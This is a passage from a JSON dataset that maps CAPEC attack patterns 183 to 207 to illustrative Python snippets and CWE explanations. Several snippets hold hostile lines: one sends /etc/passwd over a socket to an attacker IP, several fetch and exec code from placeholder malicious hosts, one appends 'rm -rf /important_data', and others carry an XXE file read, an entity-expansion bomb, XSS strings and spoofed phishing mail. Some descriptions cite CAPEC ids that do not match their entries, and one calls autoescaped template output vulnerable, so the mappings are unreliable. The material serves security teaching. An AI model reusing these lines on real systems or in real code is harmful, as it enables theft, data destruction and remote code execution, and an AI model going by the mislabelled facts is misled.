        "code_snippet": "import requests\nfrom flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/load_flash', methods=['GET'])\ndef load_flash():\n    flash_url = request.args.get('flash_url')\n    if not flash_url:\n        return 'No flash URL provided', 400\n    try:\n        response = requests.get(flash_url)\n        if response.status_code == 200:\n            flash_content = response.text\n            return render_template_string(flash_content)\n        else:\n            return 'Failed to load flash content', 500\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application that loads and executes Flash content from a user-specified URL. The main idea of the CAPEC (Flash Injection) is demonstrated by allowing an attacker to specify a URL that points to malicious Flash content. The code does not properly validate the input URL (CWE-20: Improper Input Validation) and directly renders the content without any sanitization, leading to potential execution of malicious code (CWE-506: Embedded Malicious Code). Additionally, the code does not restrict the domains from which Flash content can be loaded (CWE-942: Permissive Cross-domain Policy with Untrusted Domains), making it susceptible to cross-site flashing attacks."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "import smtplib\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/send_email', methods=['POST'])\ndef send_email():\n    recipient = request.form['recipient']\n    subject = request.form['subject']\n    body = request.form['body']\n\n    # Vulnerable code: directly using user input in SMTP commands\n    smtp_command = f\"MAIL FROM:<attacker@example.com>\\r\\nRCPT TO:<{recipient}>\\r\\nDATA\\r\\nSubject: {subject}\\r\\n{body}\\r\\n.\\r\\n\"\n\n    try:\n        server = smtplib.SMTP('localhost')\n        server.sendmail('attacker@example.com', [recipient], smtp_command)\n        server.quit()\n        return 'Email sent successfully'\n    except Exception as e:\n        return str(e)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web-mail server endpoint that allows users to send emails. The Flask web application receives user input for the recipient, subject, and body of the email via a POST request. The user input is then directly embedded into an SMTP command without proper sanitization or validation, making it susceptible to IMAP/SMTP command injection attacks (CAPEC-138). The code also highlights several related CWEs: CWE-77 (Improper Neutralization of Special Elements used in a Command), CWE-116 (Improper Encoding or Escaping of Output), and CWE-209 (Generation of Error Message Containing Sensitive Information). If an attacker crafts a malicious input, they could potentially execute arbitrary commands on the SMTP server, leading to unauthorized actions or information disclosure."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# Directly executing the downloaded code without integrity check\nexec(response.text)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nimport os\nsensitive_info = os.popen('cat /etc/passwd').read()\nprint(sensitive_info)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code that sends sensitive information to an attacker-controlled server\nimport socket\nattacker_ip = '192.168.1.100'\nattacker_port = 4444\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((attacker_ip, attacker_port))\nsock.sendall(sensitive_info.encode('utf-8'))\nsock.close()",
        "description": "This Python code snippet demonstrates a 'Software Integrity Attack' by combining several related CWEs. The code downloads and executes a script from a remote location without verifying its integrity (CWE-494). It then exposes sensitive system information (CWE-497) by reading and printing the contents of '/etc/passwd'. Finally, it contains embedded malicious code (CWE-506) that sends the sensitive information to an attacker-controlled server. This snippet highlights how an attacker can undermine software integrity and compromise system security."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious-script.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\nif response.status_code == 200:\n    with open('downloaded_script.py', 'wb') as file:\n        file.write(response.content)\n\n    # Execute the downloaded script without verifying its integrity or origin\n    os.system('python downloaded_script.py')\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# The downloaded script could potentially access and expose sensitive information\n",
        "description": "This Python code snippet demonstrates a scenario where a script is downloaded from a remote location and executed without verifying its integrity or origin (CWE-494). The downloaded script could contain embedded malicious code (CWE-506) or act as a Trojan Horse (CWE-507), appearing benign but performing malicious actions. By executing the script without proper checks, it could potentially expose sensitive system information to unauthorized actors (CWE-497). This embodies the main idea of the CAPEC 'Malicious Software Download', where an attacker uses deceptive methods to cause a user or an automated process to download and install dangerous code."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import requests\n\n# URL of the malicious update\nmalicious_update_url = 'http://malicious.example.com/update'\n\n# Download the update without integrity check\nresponse = requests.get(malicious_update_url)\n\n# Execute the downloaded code\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a 'Malicious Software Update' attack. The code downloads an update from a URL without performing any integrity checks (CWE-494). The downloaded content is then executed directly, which could contain embedded malicious code (CWE-506) or act as a Trojan Horse (CWE-507). This represents the main idea of the CAPEC, where an adversary tricks a user or system into downloading and executing harmful code under the guise of a legitimate update."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\n\n# URL of the update server\nupdate_url = 'http://malicious-server.com/update'\n\n# Download the update without verifying its integrity\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # Execute the downloaded code without validation\n    exec(response.text)\nelse:\n    print('Failed to download update')",
        "description": "This Python code snippet demonstrates a vulnerable software update mechanism. The code downloads an update from a specified URL without verifying the integrity or authenticity of the source. If the download is successful, it executes the downloaded code directly. This embodies the main idea of CAPEC-494, where an attacker can exploit the lack of proper authentication and integrity checks to introduce malicious code into the system. The related CWEs are represented as follows: CWE-494 (Download of Code Without Integrity Check) is shown by the lack of verification of the downloaded content, CWE-294 (Authentication Bypass by Capture-replay) is implied by the absence of secure authentication mechanisms, CWE-602 (Client-Side Enforcement of Server-Side Security) is suggested by the reliance on the client to handle security, CWE-506 (Embedded Malicious Code) is represented by the potential execution of malicious code, and CWE-807 (Reliance on Untrusted Inputs in a Security Decision) is demonstrated by the use of untrusted input (the downloaded code) in a critical security decision (execution)."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import base64\n\n# Simulate sensitive system information\nsensitive_info = 'SensitiveSystemInformation'\n\n# Encode the sensitive information using a weak algorithm (base64)\nencoded_info = base64.b64encode(sensitive_info.encode()).decode()\n\n# Undocumented feature: hidden debug mode\ndef hidden_debug_mode():\n    print('Debug mode activated')\n\n# Function to simulate exposure of sensitive information\ndef expose_sensitive_info():\n    # Simulate a condition where sensitive information is exposed\n    if True:  # This condition is always true, simulating a vulnerability\n        print(f'Exposed Information: {encoded_info}')\n\n# Main function\nif __name__ == '__main__':\n    expose_sensitive_info()\n    hidden_debug_mode()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to reverse engineering and the associated CWEs. The code encodes sensitive system information using a weak cryptographic algorithm (base64), which is easily reversible (CWE-327). It includes an undocumented feature (hidden debug mode) that can be exploited by an attacker (CWE-1242). The function 'expose_sensitive_info' simulates the exposure of sensitive information to unauthorized actors (CWE-497). The overall idea represents how reverse engineering can be used to discover and exploit these vulnerabilities."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import time\nimport random\n\nclass SecureDevice:\n    def __init__(self, secret_key):\n        self.secret_key = secret_key\n\n    def authenticate(self, input_key):\n        # Simulate power consumption pattern\n        power_consumption = 0\n        for i in range(len(self.secret_key)):\n            if i < len(input_key) and input_key[i] == self.secret_key[i]:\n                power_consumption += random.uniform(0.1, 0.2)\n            else:\n                power_consumption += random.uniform(0.2, 0.3)\n            time.sleep(0.01)  # Simulate time delay for each comparison\n        return input_key == self.secret_key\n\n# Example usage\nsecret_key = 'supersecret'\ndevice = SecureDevice(secret_key)\n\n# An attacker could use power consumption patterns to guess the secret key\ninput_key = 'supersecrex'\nprint(device.authenticate(input_key))",
        "description": "This Python code snippet represents a simplified model of a secure device that uses a secret key for authentication. The `authenticate` method compares the input key with the secret key character by character. During this process, it simulates power consumption patterns and time delays, which can be observed by an attacker. This embodies the main idea of CAPEC-163 (Black Box Reverse Engineering) by demonstrating how an attacker could use side-channel information (e.g., power consumption) to infer the secret key. The code also highlights CWE-203 (Observable Discrepancy) and CWE-1255 (Comparison Logic is Vulnerable to Power Side-Channel Attacks) by showing how discrepancies in power consumption and timing can leak sensitive information."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import os\nimport requests\n\n# Hidden functionality: Download and execute code from a remote server\n# CWE-912: Hidden Functionality\n# CWE-494: Download of Code Without Integrity Check\n# CWE-506: Embedded Malicious Code\n\n# URL of the remote code (malicious server)\nremote_code_url = 'http://malicious-server.com/malicious_code.py'\n\n# Function to download and execute code\ndef download_and_execute_code(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Save the downloaded code to a temporary file\n        with open('temp_code.py', 'w') as file:\n            file.write(response.text)\n        # Execute the downloaded code\n        os.system('python temp_code.py')\n    else:\n        print('Failed to download code')\n\n# Hidden functionality triggered by a specific condition\nif os.getenv('TRIGGER_HIDDEN_FUNC') == '1':\n    download_and_execute_code(remote_code_url)",
        "description": "This Python code snippet demonstrates a hidden functionality that downloads and executes code from a remote server. The hidden functionality is triggered by an environment variable 'TRIGGER_HIDDEN_FUNC'. This represents the CAPEC idea of reverse engineering to expose hidden functionality. The code also embodies several related CWEs: CWE-912 (Hidden Functionality) by having a hidden feature not documented or obvious to users, CWE-494 (Download of Code Without Integrity Check) by downloading and executing code without verifying its integrity, and CWE-506 (Embedded Malicious Code) by potentially executing malicious code from a remote server."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "import hashlib\n\n# Hard-coded sensitive constants\nSECRET_KEY = 'hardcoded_secret_key'\nPASSWORD = 'hardcoded_password'\n\n# Function that uses the hard-coded credentials\ndef authenticate(user_input):\n    if user_input == PASSWORD:\n        return 'Authenticated'\n    else:\n        return 'Access Denied'\n\n# Function that uses the hard-coded secret key\ndef generate_hash(data):\n    return hashlib.sha256((data + SECRET_KEY).encode()).hexdigest()\n\n# Example usage\nuser_input = 'user_provided_password'\nprint(authenticate(user_input))\ndata = 'sensitive_data'\nprint(generate_hash(data))",
        "description": "This Python code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive constants such as a secret key and a password. The 'authenticate' function uses a hard-coded password for authentication, and the 'generate_hash' function uses a hard-coded secret key to generate a hash. This code is vulnerable because an adversary can discover these hard-coded values through static or dynamic analysis, leading to potential security breaches. The code embodies CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants), and CWE-318 (Cleartext Storage of Sensitive Information in Executable)."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import socket\n\n# Inadequate encryption strength (CWE-326)\ndef weak_encrypt(data):\n    return ''.join(chr(ord(char) + 1) for char in data)  # Simple Caesar cipher\n\n# Cleartext transmission of sensitive information (CWE-319)\ndef send_data_cleartext(data, host, port):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(data.encode('utf-8'))\n\n# Selection of less-secure algorithm during negotiation (CWE-757)\ndef negotiate_algorithm(preferred_algorithms):\n    available_algorithms = ['AES', 'DES']  # Assume 'DES' is less secure\n    for alg in preferred_algorithms:\n        if alg in available_algorithms:\n            return alg\n    return 'DES'  # Fallback to less secure algorithm\n\n# Example usage\nsensitive_data = 'password123'\nweak_encrypted_data = weak_encrypt(sensitive_data)\nselected_algorithm = negotiate_algorithm(['AES', 'DES'])\n\nif selected_algorithm == 'DES':\n    print('Warning: Using less secure algorithm DES')\n\n# Transmitting weakly encrypted data in cleartext\nsend_data_cleartext(weak_encrypted_data, 'example.com', 12345)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to protocol analysis and encryption weaknesses. The `weak_encrypt` function uses a simple Caesar cipher, which is an example of inadequate encryption strength (CWE-326). The `send_data_cleartext` function transmits sensitive data in cleartext (CWE-319), making it susceptible to interception. The `negotiate_algorithm` function simulates the selection of a less secure algorithm during negotiation (CWE-757), defaulting to 'DES' if no preferred algorithm is available. The example usage shows how these vulnerabilities can be combined, resulting in the transmission of weakly encrypted data using a less secure algorithm, highlighting the risks described in the CAPEC."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import requests\n\n# Vulnerable function that includes remote file based on user input\n\ndef include_remote_file(file_url):\n    try:\n        # Fetch the remote file content\n        response = requests.get(file_url)\n        response.raise_for_status()\n        # Execute the remote file content\n        exec(response.text)\n    except requests.RequestException as e:\n        print(f\"Error fetching remote file: {e}\")\n\n# Example usage\nuser_input = 'http://example.com/malicious_code.py'\ninclude_remote_file(user_input)",
        "description": "This Python code snippet demonstrates a vulnerability similar to PHP Remote File Inclusion (RFI). The function `include_remote_file` takes a URL as input, fetches the content from that URL, and executes it using the `exec` function. This is dangerous because it allows an attacker to execute arbitrary code hosted on a remote server. The code does not sanitize or validate the input URL, making it susceptible to exploitation. This example embodies the main idea of CAPEC-98 and related CWEs by showing how improper control of input can lead to remote code execution vulnerabilities."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable email sending function\n\ndef send_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address  # This can be easily spoofed\n    msg['To'] = to_address\n\n    # Connect to the SMTP server\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click this link to update your account.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that allows an attacker to spoof the 'From' address. The function 'send_email' takes in the recipient's email address, the sender's email address, the subject, and the body of the email. It constructs the email message and sends it using an SMTP server. The vulnerability lies in the fact that the 'From' address can be easily spoofed, allowing an attacker to send an email that appears to come from a trusted source. This can lead to various attacks such as phishing, privilege escalation, and data manipulation. The code does not implement any form of authentication or verification of the sender's identity, which is a key aspect of the CAPEC 'Fake the Source of Data' and related CWEs such as Improper Authentication (CWE-287) and Authentication Bypass by Spoofing (CWE-290)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-1390: Weak Authentication\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Function to send a spoofed email\ndef send_spoofed_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    # Here, we are not verifying the destination address\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nsend_spoofed_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click the link to update your account.')",
        "description": "This Python code snippet demonstrates a Principal Spoof attack by sending a spoofed email. The function `send_spoofed_email` constructs an email message that appears to come from a legitimate source (spoofed@example.com) and sends it to the victim (victim@example.com). The code leverages CWE-290 (Authentication Bypass by Spoofing) by not verifying the sender's identity, CWE-1390 (Weak Authentication) by not ensuring the sender's authenticity, and CWE-941 (Incorrectly Specified Destination in a Communication Channel) by not verifying the destination address. This example highlights how an attacker can craft a message that appears to come from a trusted source to deceive the recipient."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import hashlib\nimport time\nimport random\n\n# Weak credentials (CWE-1391)\nSECRET_KEY = 'default_secret_key'\n\n# Function to generate a session token\n# This function uses weak credentials and does not ensure proper session expiration (CWE-613)\ndef generate_session_token(user_id):\n    timestamp = str(int(time.time()))\n    random_value = str(random.randint(0, 1000000))\n    session_data = user_id + timestamp + random_value + SECRET_KEY\n    session_token = hashlib.sha256(session_data.encode()).hexdigest()\n    return session_token\n\n# Example usage\nuser_id = 'user123'\nsession_token = generate_session_token(user_id)\nprint(f\"Generated session token: {session_token}\")\n\n# The session token is generated using weak credentials and does not expire properly\n# This can be exploited by an attacker to forge a valid session token (CAPEC-384)\n",
        "description": "This Python code snippet demonstrates the generation of a session token using weak credentials (CWE-1391) and insufficient session expiration (CWE-613). The `generate_session_token` function creates a session token based on the user ID, current timestamp, a random value, and a weak secret key. The session token is generated using SHA-256 hashing. This approach embodies the main idea of CAPEC-384, where an attacker can forge a valid session token by exploiting weak credentials and insufficient session expiration. The code highlights the vulnerabilities that can lead to session credential falsification through forging."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Define a recursive XML entity expansion\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY a \"a\">\n<!ENTITY b \"&a;&a;\">\n<!ENTITY c \"&b;&b;\">\n<!ENTITY d \"&c;&c;\">\n<!ENTITY e \"&d;&d;\">\n<!ENTITY f \"&e;&e;\">\n<!ENTITY g \"&f;&f;\">\n<!ENTITY h \"&g;&g;\">\n<!ENTITY i \"&h;&h;\">\n<!ENTITY j \"&i;&i;\">\n<!ENTITY k \"&j;&j;\">\n<!ENTITY l \"&k;&k;\">\n<!ENTITY m \"&l;&l;\">\n<!ENTITY n \"&m;&m;\">\n<!ENTITY o \"&n;&n;\">\n<!ENTITY p \"&o;&o;\">\n<!ENTITY q \"&p;&p;\">\n<!ENTITY r \"&q;&q;\">\n<!ENTITY s \"&r;&r;\">\n<!ENTITY t \"&s;&s;\">\n<!ENTITY u \"&t;&t;\">\n<!ENTITY v \"&u;&u;\">\n<!ENTITY w \"&v;&v;\">\n<!ENTITY x \"&w;&w;\">\n<!ENTITY y \"&x;&x;\">\n<!ENTITY z \"&y;&y;\">\n]>\n<root>&z;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\nexcept ET.ParseError as e:\n    print(f\"ParseError: {e}\")\nexcept MemoryError as e:\n    print(f\"MemoryError: {e}\")\n",
        "description": "This Python code snippet demonstrates an Exponential Data Expansion attack using XML entity expansion. The XML data contains nested entity definitions that expand exponentially, leading to excessive memory and CPU usage when parsed. The code attempts to parse this XML data using the xml.etree.ElementTree library, which can result in a ParseError or MemoryError due to the excessive resource demands. This example embodies the main idea of CAPEC-230 (Exponential Data Expansion) and highlights related weaknesses such as CWE-776 (Improper Restriction of Recursive Entity References in DTDs) and CWE-770 (Allocation of Resources Without Limits or Throttling)."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/error')\ndef error_page():\n    error_message = request.args.get('msg', '')\n    if not error_message:\n        abort(400)\n    # Vulnerable to XSS\n    return f'<html><body><h1>Error: {error_message}</h1></body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes an endpoint '/error'. The endpoint takes a query parameter 'msg' and displays it in an error message on the resulting web page. The code is vulnerable to Cross-Site Scripting (XSS) attacks because it directly includes user input in the HTML response without proper sanitization or neutralization. This embodies the main idea of the CAPEC 'XSS Targeting Error Pages' by demonstrating how an attacker could exploit a malformed request containing malicious script code to execute it in the context of an error page. The related CWEs highlight the specific weaknesses, such as improper neutralization of script elements and incomplete denylist mechanisms, that make this code vulnerable."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Incomplete denylist to filter out script tags\n    denylist = ['<script>', '</script>']\n    for item in denylist:\n        query = query.replace(item, '')\n    # Vulnerable to XSS using alternate syntax\n    return render_template_string('<p>Search results for: {{ query }}</p>', query=query)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks using alternate syntax. The application has a search endpoint that takes user input from the query parameter 'q'. It attempts to filter out script tags using an incomplete denylist, which only includes '<script>' and '</script>'. However, this denylist is insufficient as it does not account for alternate forms of the script tag, such as 'ScRiPt' or 'SCRIPT'. The filtered input is then rendered directly into an HTML template without proper neutralization, making the application susceptible to XSS attacks. This example embodies the main idea of CAPEC-246 (XSS Using Alternate Syntax) and highlights related CWEs such as CWE-87, CWE-80, CWE-692, and CWE-1336."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import re\n\ndef process_input(user_input):\n    # Input filter removed, allowing potentially dangerous input\n    # filtered_input = re.sub(r'[<>\"'']', '', user_input)  # This line is commented out\n    return user_input\n\n# Simulating user input\nuser_input = '<script>alert(\"XSS\")</script>'\n\n# Processing the input without filtering\nprocessed_input = process_input(user_input)\n\n# Output the processed input\nprint(f'Processed Input: {processed_input}')",
        "description": "This Python code snippet demonstrates the removal of input filters, which is the main idea of the CAPEC described. The function `process_input` is supposed to filter out potentially dangerous characters from the user input to prevent attacks like Cross-Site Scripting (XSS). However, the filtering mechanism (a regular expression that removes special characters) is commented out, effectively disabling it. This leaves the application vulnerable to attacks, as it directly processes and outputs the unfiltered user input. This example embodies CWE-20 (Improper Input Validation), CWE-184 (Incomplete List of Disallowed Inputs), and CWE-74 (Improper Neutralization of Special Elements in Output Used by a Downstream Component)."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function to parse XML data\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        for elem in root:\n            print(elem.tag, elem.text)\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Example of serialized data with an external entity reference\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n    <data>&ext;</data>\n</root>\n'''\n\n# Parse the XML data\nparse_xml(xml_data)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The `parse_xml` function uses the `xml.etree.ElementTree` module to parse XML data. The provided `xml_data` contains an external entity reference (`&ext;`) that points to the `/etc/passwd` file. When the XML is parsed, the external entity is resolved, potentially exposing sensitive information. This example highlights CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data), as the XML parser does not restrict external entity references, leading to potential security risks."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import requests\n\nclass MaliciousClient:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def bypass_authentication(self):\n        # CWE-603: Use of Client-Side Authentication\n        response = requests.get(self.target_url, headers={'Authorization': 'FakeToken'})\n        if response.status_code == 200:\n            print('Access granted without proper authentication!')\n        else:\n            print('Access denied.')\n\n    def inject_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        payload = {'data': '<script>alert(\"Malicious Code Executed\")</script>'}\n        response = requests.post(self.target_url, data=payload)\n        if response.status_code == 200:\n            print('Malicious code injected successfully!')\n        else:\n            print('Failed to inject malicious code.')\n\n# Example usage\nclient = MaliciousClient('http://example.com/api')\nclient.bypass_authentication()\nclient.inject_malicious_code()",
        "description": "This Python code snippet demonstrates a malicious client that interacts with a target service, violating the assumptions the service makes about its clients. The `MaliciousClient` class has two methods: `bypass_authentication` and `inject_malicious_code`. The `bypass_authentication` method simulates bypassing server-side authentication by sending a request with a fake token (CWE-603). The `inject_malicious_code` method sends a payload containing a script to the target service, representing embedded malicious code (CWE-506). This code embodies the main idea of the CAPEC 'Create Malicious Client' by showing how a client can violate the expected behavior and security assumptions of a service."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\n# Open the registry key\nkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\ExampleApp', 0, winreg.KEY_SET_VALUE)\n\n# Modify a registry value\nwinreg.SetValueEx(key, 'ConfigSetting', 0, winreg.REG_SZ, 'NewValue')\n\n# Close the registry key\nwinreg.CloseKey(key)",
        "description": "This Python code snippet demonstrates how an adversary could manipulate registry information on a Windows system. The code opens a registry key for 'ExampleApp' under the current user's registry hive, modifies a configuration setting ('ConfigSetting') to a new value ('NewValue'), and then closes the registry key. This embodies the main idea of CAPEC-203, 'Manipulate Registry Information', by showing how an attacker can exploit weaknesses in authorization to change registry values. The related CWEs provide additional context: CWE-15 (External Control of System or Configuration Setting) is demonstrated by the ability to externally modify the registry setting, and CWE-314 (Cleartext Storage in the Registry) is implied if the sensitive information is stored in cleartext. This code snippet is a simplified example and does not include error handling or checks, which would be necessary in a real-world scenario."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import requests\n\n# Function to fetch sensitive data from a remote server\n# This data will be cached locally without encryption\n\ndef fetch_sensitive_data(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Cache the sensitive data locally\n        with open('cache.txt', 'w') as cache_file:\n            cache_file.write(response.text)\n        return response.text\n    else:\n        return None\n\n# Example usage\nsensitive_url = 'https://example.com/sensitive-data'\nsensitive_data = fetch_sensitive_data(sensitive_url)\nprint('Sensitive data fetched and cached.')",
        "description": "This Python code snippet demonstrates a scenario where sensitive data is fetched from a remote server and cached locally in a file named 'cache.txt' without any encryption. This embodies the main idea of the CAPEC 'Lifting Sensitive Data Embedded in Cache' by showing how sensitive information can be stored in a cache that is not appropriately protected. The related CWEs are represented as follows: CWE-524 (Use of Cache Containing Sensitive Information) is shown by caching the sensitive data, CWE-311 (Missing Encryption of Sensitive Data) is demonstrated by not encrypting the data before storing it, and CWE-525 (Use of Web Browser Cache Containing Sensitive Information) is implied by the lack of a proper caching policy. This code snippet highlights the risk of sensitive data exposure due to improper caching practices."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "import base64\n\n# Hardcoded credentials (CWE-522: Insufficiently Protected Credentials)\nusername = 'admin'\npassword = 'password123'\n\n# Encoding credentials (not secure, just for demonstration)\nencoded_credentials = base64.b64encode(f'{username}:{password}'.encode()).decode()\n\n# Simulating client-side authentication (CWE-603: Use of Client-Side Authentication)\ndef authenticate_client(encoded_creds):\n    # Insecurely checking credentials on the client side\n    if encoded_creds == encoded_credentials:\n        return 'Authenticated'\n    else:\n        return 'Authentication Failed'\n\n# Simulating a network request with encoded credentials\nnetwork_request_creds = encoded_credentials\n\n# Vulnerable to capture-replay attack (CWE-294: Authentication Bypass by Capture-replay)\nresponse = authenticate_client(network_request_creds)\nprint(response)",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to the deprecated CAPEC pattern of lifting credentials embedded in client distributions. The code hardcodes credentials (CWE-522) and performs client-side authentication (CWE-603), which can be easily bypassed by modifying the client. Additionally, the use of base64 encoding for credentials is insecure and susceptible to capture-replay attacks (CWE-294), where an attacker can intercept and reuse the encoded credentials to gain unauthorized access."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nSIGNING_KEY = 'hardcoded_signing_key'\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod('signing_key.pem', 0o777)  # Insecure permission assignment\n\n# CWE-494: Download of Code Without Integrity Check\nmalicious_code_url = 'http://malicious.example.com/malicious_code.py'\nsubprocess.run(['wget', malicious_code_url, '-O', 'malicious_code.py'])\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_code.py', 'a') as f:\n    f.write('\\n# Malicious payload\\n')\n    f.write('os.system(\"rm -rf /important_data\")')\n\n# Simulate signing the malicious code\nsubprocess.run(['openssl', 'dgst', '-sha256', '-sign', 'signing_key.pem', '-out', 'malicious_code.sig', 'malicious_code.py'])\n\nprint('Malicious code signed and ready for distribution.')",
        "description": "This Python code snippet demonstrates the concept of 'Signing Malicious Code' by using a hard-coded signing key (CWE-798) to sign a malicious script. The script first sets insecure permissions on the signing key file (CWE-732), then downloads a malicious code file without verifying its integrity (CWE-494). It appends a malicious payload to the downloaded file (CWE-506) and finally signs the malicious code using the hard-coded key. This signed malicious code can then be distributed, misleading users into believing it is legitimate and allowing the adversary to execute arbitrary code on the victim's machine."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import requests\n\n# Downloading code from an untrusted source without integrity check (CWE-494)\nresponse = requests.get('http://untrusted-source.com/malicious_code.py')\nexec(response.text)\n\n# Client-side authentication (CWE-603)\ndef client_side_authentication(user_input):\n    if user_input == 'trusted_user':\n        return True\n    return False\n\n# Function that relies on client-side enforcement (CWE-602)\ndef sensitive_operation():\n    if client_side_authentication(input('Enter username: ')):\n        print('Sensitive operation performed')\n    else:\n        print('Authentication failed')\n\n# Main function\nif __name__ == '__main__':\n    sensitive_operation()",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Removing Important Client Functionality'. The code downloads and executes a script from an untrusted source without verifying its integrity (CWE-494). It also performs authentication on the client side (CWE-603) and relies on this client-side enforcement to perform a sensitive operation (CWE-602). An attacker could modify the client to bypass the authentication check, thereby gaining unauthorized access to the sensitive operation. This represents the main idea of the CAPEC, where the server assumes the presence and trustworthiness of client-side functionality, which can be easily tampered with by an adversary."
